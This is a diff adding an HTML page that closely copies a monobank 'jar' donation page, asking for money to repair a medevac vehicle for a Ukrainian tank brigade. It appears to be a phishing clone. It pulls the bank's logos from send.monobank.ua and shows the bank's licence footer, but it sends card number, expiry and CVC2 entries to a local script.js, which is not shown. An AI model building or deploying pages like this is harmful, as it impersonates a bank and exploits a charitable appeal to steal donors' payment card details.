@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title class="i18n" n="title" id="x-title">Безпечний переказ коштів</title>
+    <meta name="title" content="Безпечний переказ коштів">
+    <link rel="icon" type="image/x-icon" href="https://send.monobank.ua/favicon.ico">
+    <link rel="stylesheet" type="text/css" href="style.css">
+</head>
+
+<body>
+    <section class="card" id="card">
+        <div class="card__header">
+            <img src="https://send.monobank.ua/img/logo_short.png" class="short-logo" alt="monobank logo" />
+            <div class="jar">
+                <img class="jarLogo  jarLogo-bg" src="https://send.monobank.ua/img/jar_bg.png" />
+                <div class="img-avatar" style="background-image: url('avatar.jpg');">
+                </div>
+                <div class="jar-container">
+                    <img class="glass" src="https://send.monobank.ua/img/jar/uah_33.png" />
+                    <div class="grid-container">
+                        <img src="https://send.monobank.ua/img/jar/grid.png" class="grid" />
+                        <div class="jar-label jar-goal">25&nbsp;000</div>
+                        <div class="jar-label jar-middle">12&nbsp;500</div>
+                        <div class="jar-label jar-bottom">0</div>
+                    </div>
+                </div>
+
+                <p class="jar__owner">Єлизавета С. збирає</p>
+                <p class="jar__name">На ремонт медеваку</p>
+            </div>
+            <div class="card__info">
+                <p>Збираємо на ремонт медеваку для<br>4ОТБР танкова бригада</p>
+                <br>
+                <p>Ремонтуємо 2 автівки - Тойоту та Нісан.</p>
+                <br>
+                <p>У бригаді є наші земляки з Черкащини!</p>
+                <br>
+                <p>Ремонт авто треба на вчора! Прохання підтримати!</p>
+            </div>
+            <div class="stats">
+                <div class="stats-data">
+                    <img src="https://send.monobank.ua/img/collected.svg" class="stats-data__icon" />
+                    <div class="stats-data__text-container">
+                        <div class="stats-data__label">Накопичено</div>
+                        <div class="stats-data__value" id="accumulated-sum">7&nbsp;700&nbsp;₴</div>
+                    </div>
+                </div>
+                <div class="stats-data">
+                    <img src="https://send.monobank.ua/img/target.svg" class="stats-data__icon" />
+                    <div class="stats-data__text-container">
+                        <div class="stats-data__label">Ціль</div>
+                        <div class="stats-data__value">25&nbsp;000&nbsp;₴</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="card__body">
+            <div class="input-money-container">
+                <div class="gradient-container">
+                    <div class="white-container">
+                        <div class="jar-top-up-title">
+                            Сума поповнення
+                            <img src="https://send.monobank.ua/img/money.png" class="money-emoji" />
+                        </div>
+
+                        <div class="generalDonation">
+                            <div class="money-input-number finalDonation">
+                                <input type="number" value="0" min="10" max="29999" content="$" id="inputNumberDonation"
+                                    oninput="checkNumberDonation()" onblur="zeroValue()" />
+                                <div class="money-input-currency finalDonation" id="currencySign"
+                                    oninput="checkNumberDonation()">&nbsp;₴</div>
+                            </div>
+                        </div>
+
+                        <div class="money-input-error hidden" id="money-input-error">Сума повинна бути від 10&nbsp;₴ до
+                            29&nbsp;999&nbsp;₴
+                        </div>
+
+                        <div class="choice-row" id="choice-row">
+                            <div class="chip-button" id="buttonAdd100">
+                                <div class="main-label">+100&nbsp;₴</div>
+                            </div>
+                            <div class="chip-button">
+                                <div class="main-label" id="buttonAdd500">+500&nbsp;₴</div>
+                            </div>
+                            <div class="chip-button">
+                                <div class="main-label" id="buttonAdd1000">+1&nbsp;000&nbsp;₴</div>
+                            </div>
+                        </div>
+
+                        <div class="input-information">
+                            <input id="inputName" class="inputF" type="text" autocomplete="cc-name" value=""
+                                placeholder="Ваше ім'я (необов'язково)" />
+                            <input id="inputComment" class="inputF" type="text" maxlength="160" autocomplete="off"
+                                value="" placeholder="Коментар (необов'язково)" />
+                        </div>
+
+                        <div class="info">
+                            <div class="mono-pay shown" id="button-mono">
+                                <img src="https://send.monobank.ua/img/mono_pay.svg" alt="mono Pay" class="logo" />
+                            </div>
+
+                            <div class="tap-to-pay shown" id="button-gpay">
+                                <div class="gpay-button-fill">
+                                    <button type="button" aria-label="Google Pay"
+                                        class="gpay-button black plain short uk">
+                                    </button>
+                                </div>
+                            </div>
+
+                            <div class="hidden-pay-by-card" id="hide-pay-by-card">
+                                <hr id="hideHr" class="splitter">
+                                </hr>
+                                <div class="card-input-button" id="card-input-button">
+                                    <img src="https://send.monobank.ua/img/card.svg" alt="Credit Card"
+                                        class="card-icon" />
+                                    <div class="card-input-label" id="pay-card">Оплатити карткою</div>
+                                </div>
+                            </div>
+
+                            <div class="pay-by-card hidden" id="show-pay-by-card">
+                                <div class="heading-pay-by-card">
+                                    <hr class="splitter half-splitter-line" />
+                                    <div class="chose-card-input-label"> aбо уведіть дані карки </div>
+                                    <hr class="splitter half-splitter-line" />
+                                </div>
+
+                                <div class="input-card-information">
+                                    <input id="card-number" class="card-number" type="text" autocomplete="cc-name"
+                                        value="" placeholder="Номер картки" onblur="showAdvice()"
+                                        oninput="checkInputs(); hideAdvice()" />
+                                </div>
+                                <div class="err1 hidden" id="err1">Введіть номер картки</div>
+                                <div class="data-button" id="data-button">
+                                    <input id="month" class="data-type" type="text" autocomplete="cc-name" value=""
+                                        placeholder="Місяць" onfocus="addBlackBorder()"
+                                        onblur="hideBlackBorder(); showError()" oninput="checkInputs(); hideError()" />
+                                    <hr class="vertical-hr" />
+                                    <input id="year" class="data-type" type="text" autocomplete="cc-name" value=""
+                                        placeholder="Рік" onfocus="addBlackBorder()"
+                                        onblur="hideBlackBorder(); showError()" oninput="checkInputs(); hideError()" />
+                                    <hr class="vertical-hr" />
+                                    <input id="cvc2" class="data-type" type="text" autocomplete="cc-name" value=""
+                                        placeholder="CVC2" onfocus="addBlackBorder()"
+                                        onblur="hideBlackBorder(); showError()" oninput="checkInputs(); hideError()" />
+                                </div>
+                                <div class="err2 hidden" id="err2">Помилка</div>
+                                <div id="button-card">
+                                    <button class="button-send-donation" id="button-send-donation" disabled>
+                                        <span>Поповнити банку</span>
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+        </div>
+    </section>
+
+    <footer>
+        <div class="footer-holder">
+            <div class="footer-copyright">АТ «УНІВЕРСАЛ БАНК» Ліцензія НБУ №92 від
+                <br>
+                20.01.1994, у держреєстрі банків №226
+            </div>
+            <div class="button-holder">
+                <div class="widget-button" id="makeDraw">
+                    <div class="widget-button-icon"><img src="https://send.monobank.ua/img/cup.svg">
+                        <div class="widget-button-icon-text">Провести розіграш</div>
+                    </div>
+                </div>
+                <div class="widget-button" id="vidgetStream">
+                    <div class="widget-button-icon"><img src="https://send.monobank.ua/img/gamepad.svg">
+                        <div class="widget-button-icon-text">Віджет для стрімів</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+
+</html>
